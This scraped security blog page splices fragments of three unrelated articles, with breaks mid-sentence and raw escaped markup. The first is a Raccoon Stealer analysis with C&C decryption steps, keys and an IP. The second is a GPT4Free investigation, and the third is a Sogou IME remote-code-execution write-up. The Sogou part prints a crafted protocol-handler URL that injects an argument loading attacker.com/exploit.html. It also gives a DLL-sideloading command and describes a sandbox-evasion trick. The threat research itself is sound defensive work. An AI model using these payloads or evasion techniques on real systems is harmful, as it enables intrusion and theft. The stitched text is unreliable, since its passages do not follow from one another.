62em){.__m__-_R_2muqssm_{--col-flex-grow:auto;--col-flex-basis:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));--col-max-width:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));}}</style><div class="m_96bdd299 mantine-Grid-col __m__-_R_2muqssm_"><article class="blog-article-body"><address class="article-author visually-hidden">By <span><a rel="author" href="/blog/authors/threat-research-team">Threat Research Team</a></span></address><div style="--container-size:var(--container-size-xxl);max-width:calc(97.5rem * var(--mantine-scale));padding-inline:0rem" class="m_7485cace mantine-Container-root" data-size="xxl" data-strategy="block" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p>We recently came across a stealer, called <code>Raccoon Stealer,</code> a name given to it by its author. Raccoon Stealer uses the <code>Telegram</code> infrastructure to store and update actual <code>C&amp;C</code> addresses.&nbsp;</p><p>Raccoon Stealer is a password stealer capable of stealing not just passwords, but various types of data, including:</p><ul><li>Cookies, saved logins and forms data from browsers</li><li>Login credentials from email clients and messengers</li><li>Files from crypto wallets</li><li>Data from browser plugins and extension</li><li>Arbitrary files based on commands from C&amp;C</li></ul><p>In addition, it’s able to download and execute arbitrary files by command from its C&amp;C. In combination with active development and promotion on underground forums, Raccoon Stealer is prevalent and dangerous.</p><p>The oldest samples of Raccoon Stealer we’ve seen have timestamps from the <code>end of April 2019</code>. Its authors have stated the same month as the start of selling the malware on underground forums. Since then, it has been updated many times. According to its authors, they fixed bugs, added features, and more.</p><h2><strong>Distribution</strong></h2><p>We’ve seen Raccoon distributed via downloaders: <code>Buer Loader</code> and <code>GCleaner</code>. According to some samples, we believe it is also being distributed in the form of <code>fake game cheats</code>, <code>patches for cracked software</code> (including hacks and mods for <code>Fortnite</code>, <code>Valorant</code>, and <code>NBA2K22</code>), or other software. Taking into account that Raccoon Stealer is for sale, it’s distribution techniques are limited only by the imagination of the end buyers. Some samples are spread unpacked, while some are protected using <code>Themida</code> or malware packers. Worth noting is that some samples were packed more than <a href="https://twitter.com/AvastThreatLabs/status/1420372556142432257">five times in a row</a> with the same packer!&nbsp;</p><p><strong>Technical details</strong></p><p>Raccoon Stealer is written in <code>C/C++</code> and built using <code>Visual Studio</code>. Samples have a size of about <code>580-600 kB</code>. The code quality is below average, some strings are encrypted, some are not.</p><p>Once executed, Racoon Stealer starts checking for the default user locale set on the infected device and won’t work if it’s one of the following:</p><ul><li>Russian</li><li>Ukrainian</li><li>Belarusian</li><li>Kazakh</li><li>Kyrgyz</li><li>Armenian</li><li>Tajik</li><li>Uzbek</li></ul><h2><strong>C&amp;C communications</strong></h2><p>The most interesting thing about this stealer is its communication with C&amp;Cs. There are four values crucial for its C&amp;C communication, which are hardcoded in every Raccoon Stealer sample:</p><ul><li><code>MAIN_KEY</code>. This value has been changed four times during the year.</li><li><code>URLs</code> of Telegram gates with channel name. Gates are used not to implement a complicated Telegram protocol and not to store any credentials inside samples</li><li><code>BotID</code> – hexadecimal string, sent to the C&amp;C every time</li><li><code>TELEGRAM_KEY</code> – a key to decrypt the C&amp;C address obtained from Telegram Gate</li></ul><p>Let’s look at an example to see how it works:<br><code>447c03cc63a420c07875132d35ef027adec98e7bd446cf4f7c9d45b6af40ea2b</code> unpacked to:<br><code>f1cfcce14739887cc7c082d44316e955841e4559ba62415e1d2c9ed57d0c6232</code>:</p><ol><li>First of all, <code>MAIN_KEY</code> is decrypted. See the decryption code in the image below:</li></ol></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro class="RichText_wrapper__xZRh7"><p>Here you can see a Telegram channel name and its status in Base64: <code>e74b2mD/ry6GYdwNuXl10SYoVBR7/tFgp2f-v32</code><br>The prefix (always five characters) and postfix (always six characters) are removed and it becomes <code>mD/ry6GYdwNuXl10SYoVBR7/tFgp</code> The Base64 is then decoded to obtain an encrypted C&amp;C URL:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" 1x, 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Frs04.png.webp%3Fitok%3D9d_O_IJS&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><p>The <code>TELEGRAM_KEY</code> in this sample is a string <code>739b4887457d3ffa7b811ce0d03315ce</code> and the Raccoon uses it as a key to <code>RC4</code> algorithm to finally decrypt the C&amp;C URL: <code>http://91.219.236[.]18/</code></p><ol start="4"><li>Raccoon makes a query string with PC information (machine GUID and user name), and <code>BotID</code></li><li>Query string is encrypted with <code>RC4</code> using a <code>MAIN_KEY</code> and then encoded with Base64.</li><li>This data is sent using POST to the C&amp;C, and the response is encoded with Base64 and encrypted with the <code>MAIN_KEY</code>. Actually, it’s a JSON with a lot of parameters and it looks like this:</li></ol></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source 2x" class="RichText_wrapper__xZRh7"><p>Thus, the Telegram infrastructure is used to store and update actual C&amp;C addresses. It looks quite convenient and reliable until Telegram decides to take action.&nbsp;</p><p><strong>Analysis</strong></p><h2><strong>The people behind Raccoon Stealer</strong></h2><p>Based on our analysis of seller messages on underground forums, we can deduce some information about the people behind the malware. Raccoon Stealer was developed by a team, some (or maybe all) members of the team are Russian native speakers. Messages on the forum are written in Russian, and we assume they are from former USSR countries because they try to prevent the Stealer from targeting users in these countries.</p><p>Possible names/nicknames of group members may be supposed based on the analysis of artifacts, found in samples:</p><ul><li><code>C:\Users\a13xuiop1337\</code></li><li><code>C:\Users\David\&nbsp;</code></li></ul><h2><strong>Prevalence</strong></h2><p>Raccoon Stealer is quite prevalent: from <code>March 3, 2021 - February 17, 2022</code> our systems detected <code>more than 25,000</code> Raccoon-related samples. We identified <code>more than 1,300</code> distinct configs during that period.<br>&nbsp;</p><p>Here is a map, showing the number of systems Avast protected from Raccoon Stealer from <code>March 3, 2021 - February 17, 2022</code>. In this time frame, Avast protected nearly <code>600,000</code> Raccoon Stealer attacks.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source 1x, 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Frs06.png.webp%3Fitok%3DL7c9xtm9&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><p>The country where we have blocked the most attempts is Russia, which is interesting because the actors behind the malware don’t want to infect computers in Russia or Central Asia. We believe the attacks spray and pray, distributing the malware around the world. It’s not until it makes it onto a system that it begins checking for the default locale. If it is one of the language listed above, it won’t run. This explains why we detected so many attack attempts in Russia, we block the malware before it can run, ie. before it can even get to the stage where it checks for the device’s locale. If an unprotected device that comes across the malware with its locale set to English or any other language that is not on the exception list but is in Russia, it would stiIl become infected.&nbsp;</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/rs07.png.webp?itok=j8AiQ7xC 1x, class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Screenshot with claims about not working with CIS</p></div><div class="RichText_wrapper__xZRh7"><h2><strong>Telegram Channels</strong></h2><p>From the more than 1,300 distinct configs we extracted, 429 of them are unique Telegram channels. Some of them were used only in a single config, others were used dozens of times. The most used channels were:</p><ul><li><code>jdiamond13</code> – 122 times</li><li><code>jjbadb0y</code> – 44 times</li><li><code>nixsmasterbaks2</code> – 31 times</li><li><code>hellobyegain</code> – 25 times</li><li><code>h_smurf1kman_1&nbsp;</code> – 24 times</li></ul><p>Thus, five of the most used channels were found in about <code>19%</code> of configs.</p><h2><strong>Malware distributed by Raccoon</strong></h2><p>As was previously mentioned, Raccoon Stealer is able to download and execute arbitrary files from a command from C&amp;C. We managed to collect some of these files. We collected <code>185 files</code>, with a total size <code>265 Mb</code>, and some of the groups are:</p><ul><li><code>Downloaders</code> – used to download and execute other files</li><li><code>Clipboard crypto stealers</code> – change crypto wallet addresses in the clipboard – very popular (more than 10%)</li><li><code>WhiteBlackCrypt Ransomware</code></li></ul><h3><strong>Servers used to download this software</strong></h3><p>We extracted unique links to other malware from Raccoon configs received from C&amp;Cs, it was <code>196 unique URLs</code>. Some analysis results:</p><ul><li><code>43% </code>of URLs have <code>HTTP</code> scheme, <code>57%</code> – <code>HTTPS</code>.</li><li><code>83 domain names</code> were used.</li><li>About <code>20% of malware</code> were placed on <code>Discord CDN</code></li><li>About <code>10%</code> were served from <code>aun3xk17k[.]space</code></li></ul><p><strong>Conclusion</strong></p><p>We will continue to monitor Raccoon Stealer’s activity, keeping an eye on new C&amp;Cs, Telegram channels, and downloaded samples. We predict it may be used wider by other cybercrime groups. We assume the group behind Raccoon Stealer will further develop new features, including new software to steal data from, for example, as well as bypass protection this software has in place.</p><h2><strong>IoC</strong></h2><p><code>447c03cc63a420c07875132d35ef027adec98e7bd446cf4f7c9d45b6af40ea2b</code><br><code>f1cfcce14739887cc7c082d44316e955841e4559ba62415e1d2c9ed57d0c6232</code></p></div><p first, nothing about the conversation looks unusual. You open g4f.dev, choose one of the many AI models on offer, type a question and watch the answer appear. The exchange feels direct, almost private: you, the website and the model whose name you selected.\u0026nbsp;\u003c/p\u003e\u003cp\u003eWe decided to follow the prompt. What looked like a simple conversation quickly became much more crowded, with GPT4Free infrastructure, provider code, third-party services and external model endpoints all potentially playing a part. Along the way, details about the request could be recorded together with the user’s IP address and approximate location, while the model named in the interface did not always match the model identified in the response.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe strangest part came when we examined where some of those requests might be processed. The project includes lists of externally accessible Ollama systems, including servers on personal-looking domains and infrastructure associated with organizations or other services. Their relationship with GPT4Free is not made clear to the person whose prompt may be sent in their direction.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis is not a story about every free AI service, and “free” is not in itself evidence of anything sinister. It is a look at one popular service and at how little a polished chatbot interface can reveal about the people, systems and data practices operating behind it.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image_inline","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_medium/public/2026-09/before-we-go-further.png.webp?itok=OpDsCjxW 1x","media":"(min-width: 720px)","type":"image/webp","width":1076,"height":673},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2026-09/before-we-go-further.png.webp?itok=TfuMPBD6 1x","media":"(min-width: 420px)","type":"image/webp","width":720,"height":450}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2026-09/before-we-go-further.png.webp?itok=TfuMPBD6","link":""}]},{"bundle":"rich_text","content":"\u003ch2\u003e\u003cstrong\u003eWe followed the prompt\u0026nbsp;\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eGPT4Free is a widely followed open-source project that can be installed locally, but it also operates a hosted chat service at g4f.dev. Our analysis concentrated on that hosted version, where visitors can choose from models carrying names associated with OpenAI, Google, Anthropic and other developers without creating separate accounts with those companies.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/figure1.png.webp?itok=E9n8dPSv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/figure1.png.webp?itok=ih6qS0Yx 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":756},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/figure1.png.webp?itok=P1xGTKN0 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/figure1.png.webp?itok=8EE15n3x 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":575},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/figure1.png.webp?itok=8_AK0Iwc 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/figure1.png.webp?itok=gc0NJhAK 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":446}],"caption":"Figure 1. The GPT4Free hosted chat presents models and providers through one interface.  ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/figure1.png.webp?itok=8_AK0Iwc","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eBehind that one interface sits a collection of providers, small pieces of code that take a chat request and adapt it to whatever the next service expects. Some lead towards official model endpoints, others recreate the web exchanges used by third-party AI sites, and some draw on custom servers. Routes that are technically very different become visually indistinguishable once they appear in the same model menu.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFollowing the request therefore meant looking past the label in the interface. We compared the model chosen by the user with the provider selected by GPT4Free, the request sent onwards and the identifier returned with the answer. That was when the apparently straightforward conversation began to come apart.\u0026nbsp;\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eThe model we chose was not always the model that answered\u0026nbsp;\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eSeveral of our tests used options associated with the Gemini provider. The prompts travelled through an OpenAI-compatible chat endpoint on g4f.space before being directed to Google’s Gemini infrastructure, but in some of those exchanges the model named in the response differed from the one we had selected in GPT4Free.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/figure2.png.webp?itok=382vTHng 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/figure2.png.webp?itok=20NyihUt 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":621},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/figure2.png.webp?itok=JPwOA3eC 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/figure2.png.webp?itok=sxF6odCA 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":472},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/figure2.png.webp?itok=uOg1TR8v 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/figure2.png.webp?itok=yBql9ZPg 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":366}],"caption":"Figure 2. A test request shows the model selected in the GPT4Free interface and the model identifier returned in the response. ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/figure2.png.webp?itok=uOg1TR8v","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eDuring our testing, we observed multiple cases in which the model reported in the response differed from the one requested. Google documents that a latest alias can be updated to a newer release within the same model variation, which may explain some model changes. However, that documented behaviour does not explain the cases in which requests for Gemini Pro or Gemini Omni resulted in responses reporting models/gemini-3-flash-preview. GPT4Free’s code uses defaultModel when no model is provided or when the selection is set to “auto”, but neither condition applied in these tests. Based on the evidence currently available, we cannot determine where in the chain the model was changed or which service was responsible.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFor someone using the chat, the uncertainty remains regardless of which system made the switch. Selecting a model in an aggregator tells you what you requested, but it does not prove what ultimately processed the prompt. Establishing that requires the entire trail, from the interface and provider to the request sent upstream and the identifier that comes back with the response.\u0026nbsp;\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eThen the trail led to other people’s AI servers\u0026nbsp;\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eThe investigation became more unusual when we reached Ollama.swarm. Ollama allows people to run large language models on their own computers, and much of its privacy appeal comes from keeping prompts and answers on that hardware. Its API normally listens only on the local machine, although an owner can expose it to a wider network, deliberately or through a configuration mistake, and an exposed instance may end up reachable from the public internet.\u0026nbsp;\u003c/p\u003e\u003cp\u003eGPT4Free’s provider code relies on JSON files containing addresses for external AI endpoints. One seed file describes 196 Ollama sources and actually contains slightly more than 200 entries. A comment attributes 20 of them to Shodan, while the origin of the rest is left unexplained in the material we examined. Its owner may knowingly provide capacity to GPT4Free, may have exposed the service for another purpose, or may not realise that it can be reached at all. Points\u003c/h2\u003e\n\u003cp\u003eGen Threat Labs discovered a critical remote code execution vulnerability (CVE-2026-51990) in Sogou Input Method, one of the most widely used Chinese-language input method editors with hundreds of millions of installations.\u003c/p\u003e\n\u003cp\u003eThe vulnerability chains three separate weaknesses into a single, one-click exploit: unvalidated command-line argument injection in the sgbiz: custom protocol handler, unrestricted URL navigation in a CEF-based webview, and a severely outdated, unsandboxed Chromium browser engine.\u003c/p\u003e\n\u003cp\u003eWe observed this vulnerability actively exploited in the wild by the UNC3569 threat group to deploy the GRAYRABBIT backdoor through a crafted link.\u003c/p\u003e\n\u003cp\u003eThe vulnerability was reported to Tencent, who owns and develops Sogou Input Method, and has since been fixed.\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you are reading this on a computer in China, there is a good chance you have Sogou Input Method installed. It is one of the most popular Chinese-language input method editors (IMEs) for Windows, with hundreds of millions of users. Like many modern desktop applications, Sogou Input Method ships with its own embedded browser engine, an update mechanism, and a set of custom protocol handlers that let different components talk to each other.\u003c/p\u003e\n\u003cp\u003eDuring a routine investigation of a UNC3569 intrusion, we traced the initial access back to something unexpected: the process chain started inside Sogou Input Method. That finding led us down a rabbit hole that ended with a critical remote code execution vulnerability, a single crafted link that could silently open a backdoor on any machine running the software. No user interaction beyond clicking the link was required.\u003c/p\u003e\n\u003cp\u003eWe reported the vulnerability to Tencent, who patched it in a subsequent update. It was assigned CVE-2026-51990.\u003c/p\u003e\n\u003cp\u003eIn this post, we walk through the vulnerability in detail, explain how each piece fits together, and then cover what UNC3569 did with it in the wild.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/img1_0.png.webp?itok=4kHyq4iT 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/img1_0.png.webp?itok=rPvctLmC 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":658},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/img1_0.png.webp?itok=q9E5X2Jo 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/img1_0.png.webp?itok=_K-Sese1 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":501},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img1_0.png.webp?itok=b4c66E9U 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/img1_0.png.webp?itok=RZR-48Ho 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":388}],"caption":"Figure 1. Sogou Input Method is not a single executable. It is a collection of components that communicate through a custom protocol scheme registered on Windows: sgbiz:.\u003c/p\u003e\n\u003cp\u003eWhen the user (or a webpage, or any application) opens a URL that starts with sgbiz:, Windows hands it off to biz_helper.exe, the protocol handler. This binary parses the URL, figures out what the caller is asking for, and dispatches the request to the appropriate Sogou component.\u003c/p\u003e\n\u003cp\u003eA typical sgbiz: URL looks something like this:\nsgbiz:sg_process?module=sgmyinput.exe\u0026amp;param=-page=skincenter\u003c/p\u003e\n\u003cp\u003eThe URL path (sg_process, component, td_process) tells biz_helper.exe which handler to use. The query parameters provide the details: which executable to launch, what arguments to pass, what working directory to use, and so on. This is where things go wrong.\u003c/p\u003e\n\u003ch2\u003eVulnerability 1: Unvalidated Argument Injection in biz_helper.exe\u003c/h2\u003e\n\u003cp\u003eThe first link in the chain is the protocol handler itself. When biz_helper.exe receives an sgbiz: URL with the sg_process command, it extracts five parameters from the URL:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003emodule\u003c/strong\u003e: the name of the Sogou executable to launch\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eparam\u003c/strong\u003e: command-line arguments to pass to that executable\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ework_dir\u003c/strong\u003e: the working directory\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003estart_mode\u003c/strong\u003e: how to launch the process (CreateProcessW or ShellExecuteW)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003estart_show\u003c/strong\u003e: the window show state\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe module parameter gets a thorough security check. The validation function scans it for forbidden characters (\\ / : * ? \" \u0026lt; \u0026gt; |) to block path traversal, enforces a MAX_PATH length limit, resolves the name relative to the Sogou installation directory, and then calls GetFileAttributesW to confirm the target file actually exists and is not a directory.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/img2.png.webp?itok=QYXPdnGv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/img2.png.webp?itok=YYw1LPjC 2x","media":"(min-width: 1020px)","type":"image/webp","width":641,"height":679},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/img2.png.webp?itok=MUtNeoqm 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/img2.png.webp?itok=RRA7yVMV 2x","media":"(min-width: 720px)","type":"image/webp","width":641,"height":679},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img2.png.webp?itok=MF5tuORP 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/img2.png.webp?itok=0X97K1ae 2x","media":"(min-width: 420px)","type":"image/webp","width":641,"height":679}],"caption":"Figure 2. IDA snippet for the path traversal and file checks ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img2.png.webp?itok=MF5tuORP","link":""}]},{"bundle":"markdown","content":"\u003cp\u003eThis validation exists for a good reason. It is there to block path traversal through the module parameter, which would allow attackers to launch arbitrary executables. But they missed something.\u003c/p\u003e\n\u003cp\u003eThe param parameter, which controls what command-line arguments get passed to the launched executable, receives no validation at all. After being extracted from the URL, it goes through a single URL decode (the mbdup function) and is then passed directly and unmodified as the command-line arguments to whatever executable module points to. No sanitization, no allowlisting, no filtering, nothing.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/img3.png.webp?itok=AUfDHVZs 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/img3.png.webp?itok=FOGzqYSE 2x","media":"(min-width: 1020px)","type":"image/webp","width":512,"height":512},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/img3.png.webp?itok=JsVkyDSW 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/img3.png.webp?itok=z_Y90U0N 2x","media":"(min-width: 720px)","type":"image/webp","width":512,"height":512},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img3.png.webp?itok=paABf-_w 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/img3.png.webp?itok=ZXyVOgAK 2x","media":"(min-width: 420px)","type":"image/webp","width":512,"height":512}],"caption":"Figure 3. IDA snippet for the launch of SGMyInput via either CreateProcessW or ShellExecuteW","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img4.png.webp?itok=YX3YsckS","link":""}]},{"bundle":"markdown","content":"\u003ch2\u003eVulnerability 2: Unrestricted URL Navigation in SGMyInput.exe\u003c/h2\u003e\n\u003cp\u003eThe attacker's crafted URL targets SGMyInput.exe, the Sogou Input Method configuration application, and passes it a carefully chosen set of arguments:\u003c/p\u003e\n\u003cp\u003esgbiz:sg_process?module=sgmyinput.exe\u0026amp;param=-page%3Dskincenter%20-url%3Dhttps%253A%252F%252Fattacker.com%252Fexploit.html\u003c/p\u003e\n\u003cp\u003eAfter URL decoding, the param value becomes:\u003c/p\u003e\n\u003cp\u003e-page=skincenter -url=https://attacker.com/exploit.html\u003c/p\u003e\n\u003cp\u003eThe -page parameter determines which UI module SGMyInput.exe initializes. Most page types (fuzzy, confignormal, personcenter, keyset, and so on) create native Win32 configuration dialogs. But one page type is different: skincenter.\u003c/p\u003e\n\u003cp\u003eThe skincenter page is the skin marketplace. Unlike every other page type, it creates a CEF (Chromium Embedded Framework) webview to display the skin store. It is the only code path in SGMyInput.exe that instantiates a browser. This is why the attacker chose skincenter specifically. When the webview is ready, the SkinCenterWebViewEvent::OnWebViewIsReady function checks whether a custom URL was provided through the -url command-line parameter (stored in the wszCustomUrl field of the SkinCenterWebViewEvent object). Here, the same functional pattern (download from open directory, deliver XOR-encoded GRAYRABBIT) is embedded directly within the V8 exploit shellcode rather than packaged as a separate binary, potentially representing an evolution of the delivery mechanism to fit the browser-exploit initial access vector.\u003c/p\u003e\n\u003cp\u003eThe shellcode fetched three files from a staging server at 8.218.50[.]207 (Alibaba Cloud, Hong Kong), consistent with UNC3569's well-documented preference for Alibaba Cloud infrastructure in the Hong Kong and Singapore regions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e7z.exe\u003c/strong\u003e: a legitimate 7-Zip binary, used as a sideloading host\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e7zp.dll\u003c/strong\u003e: a trojanized DLL loader (internal name: boy.dll)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ep\u003c/strong\u003e: an encrypted payload blob containing the final-stage RAT\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThese files were written to C:\\Users\\Public\\Documents\\. Crucially, the shellcode saved the trojanized DLL as 7z.dll on disk (not 7zp.dll), placing it alongside the legitimate 7z.exe. It then resolved CreateProcessA from kernel32 and executed the following command with the CREATE_NO_WINDOW (0x08000000) flag:\u003c/p\u003e\n\u003cp\u003ec:\\users\\public\\documents\\7z.exe a c:\\users\\public\\documents\\p.7z c:\\users\\public\\documents\\p\u003c/p\u003e\n\u003cp\u003eThe archive command itself is irrelevant. Its sole purpose is to launch 7z.exe, which automatically loads 7z.dll from its own directory. Because the trojanized DLL has been placed there under the legitimate DLL's name, it gets sideloaded and takes over execution before 7-Zip ever processes the command line.\u003c/p\u003e\n\u003ch2\u003eThe Loader: Anti-Sandbox and Self-Deletion\u003c/h2\u003e\n\u003cp\u003eThe trojanized DLL masquerades as a legitimate 7z.dll. All standard 7-Zip exports (CreateDecoder, CreateEncoder, CreateObject, GetHandlerProperty, and so on) are present but point to empty stub functions that simply return. Only one export, GetModuleProp, contains the actual malicious code. When 7z.exe calls GetModuleProp during its initialization, the trojanized DLL springs to life.\u003c/p\u003e\n\u003cp\u003eAPI resolution is done entirely by hand, identical to how the shellcode performed it: the loader walks the PEB's InLoadOrderModuleList to find kernel32.dll by computing a ROR8 hash of each module's name.\u003c/p\u003e\n\u003cp\u003eThe loader reads the encrypted payload file from disk into memory, then runs an anti-sandbox gate before decrypting it. The gate works by creating a process snapshot with CreateToolhelp32Snapshot and counting every running process via Process32First / Process32Next. The count is compared against a threshold of 50 (0x32). If the system has 50 or more processes (typical for a real machine), the count is discarded and replaced with zero. If the system has fewer than 50 processes (typical for a sandbox), the actual count is kept.\u003c/p\u003e\n\u003cp\u003eThe DWORD XOR decryption key is then computed from three values: a deterministic floating-point result (a fixed computation that iterates 50,000 times through a sequence of sqrt, multiply, and reciprocal operations, always producing the same integer), the process count gate value, and the hardcoded constant 0x098838B0. These three values are XOR'd together. On a real machine, the gate value is zero and the XOR produces the correct decryption key. In a sandbox, the gate value is non-zero, the XOR produces a wrong key, and the payload decrypts into garbage. The decryption loop then applies this DWORD key to every four bytes of the payload buffer.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/img14.png.webp?itok=m1isX8Pq 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/img14.png.webp?itok=TRBfhCLz 2x","media":"(min-width: 1020px)","type":"image/webp","width":602,"height":386},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/img14.png.webp?itok=aAhxjkhk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/img14.png.webp?itok=GSVveQn0 2x","media":"(min-width: 720px)","type":"image/webp","width":602,"height":386},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img14.png.webp?itok=PYyhhaFD 1x, 